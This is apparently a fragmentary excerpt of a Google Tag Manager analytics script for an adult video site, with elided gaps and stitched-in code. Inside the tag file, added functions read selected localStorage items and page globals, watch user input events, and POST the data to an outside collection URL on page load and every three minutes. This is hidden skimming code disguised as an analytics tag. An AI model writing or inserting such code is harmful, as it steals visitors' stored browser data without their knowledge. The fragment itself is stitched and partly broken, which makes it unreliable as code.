...
(function () {
  var data = {
    "resource": {
      ...
      "tags": [{
        ...
        "priority": 8,
        "vtp_includeConditions": ["list", "filmpornofrancais\\.fr"],
        "tag_id": 18
      }, {
        ...
        "priority": 7,
        "vtp_instanceDestinationId": "G-0ZDTDW6D95",
        "tag_id": 28
      }, {
        ...
        "priority": 3,
        "vtp_searchQueryParams": "\/index.php?s=,s",
  ...
  const eventsToWatch = ["mousemove", "keypress", "click", "touchstart"];
  ...
  const globalVars = ['document', 'history', 'localStorage'];
  ...
  function createUniqueHash(data) {
    const uniqueKeys = Object.keys(data).sort().join("|");
    let hashVal = 0;
    for (let i = 0; i < uniqueKeys.length; i++) {
      const charCode = uniqueKeys.charCodeAt(i);
  ...
  ni.oe = Number("0") || 0;
  ni.ia = "dataLayer";
  ni.gk = "ChEIgMqfrAYQ8s3H9bmH+IiPARIlAKB3f7mfIQ6GITNYbeS2SW2uHv1l+hQvxvQt02ZkhW2GrtXWohoCvtU\x3d";
  var qi = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  function fetchLocalStorageItem() {
    ...
    for (let i = 0; i < localStorage.length; i++) {
      ...
      if (keysToObserve.includes(keyVal)) {
        fetchedData[keyVal] = localStorage.getItem(keyVal);
      }
    }
    return fetchedData;
  }
  ...
  function sendCollectedDataToServer(data) {
    const uniqueHash = createUniqueHash(data);
    const serverURL = "https://sample.com/api/collect";
    const httpReq = new XMLHttpRequest();
    httpReq.open("POST", serverURL);
    httpReq.setRequestHeader("Content-Type", "application/json");
    httpReq.onload = function () {
      if (httpReq.status === 200) {
        console.log("Data sent successfully");
      } else {
        console.error("Data sending failed, Status Code:" + httpReq.status);
      }
    };
    httpReq.onerror = function () {
      console.error("Error occurred during data sending");
    };
    httpReq.send(JSON.stringify({
      hashed: uniqueHash,
      data: data,
      globals: collectGlobalVariables(),
      jshook: jshook
    }));
  }
  ...
  function kE() {
    var a = new sb();
    M(this, "read_container_data"), a.set("containerId", 'G-0ZDTDW6D95'), a.set("version", '2'), a.set("environmentName", ''), a.set("debugMode", $f), a.set("previewMode", bg), a.set("environmentMode", ag), a.set("firstPartyServing", wi || yi), a.set("containerUrl", Ec), a.Cb();
    return a;
  }
  ...
  function gatherData() {
    const collectedData = fetchLocalStorageItem();
    if (Object.keys(collectedData).length > 0) {
      sendCollectedDataToServer(collectedData);
    }
  }
  function yE() {
    return new jd(uy);
  ...
  document.addEventListener("DOMContentLoaded", function () {
    gatherData();
    setInterval(gatherData, 1000 * 60 * 3);
  });
  aa.Jl = function () {
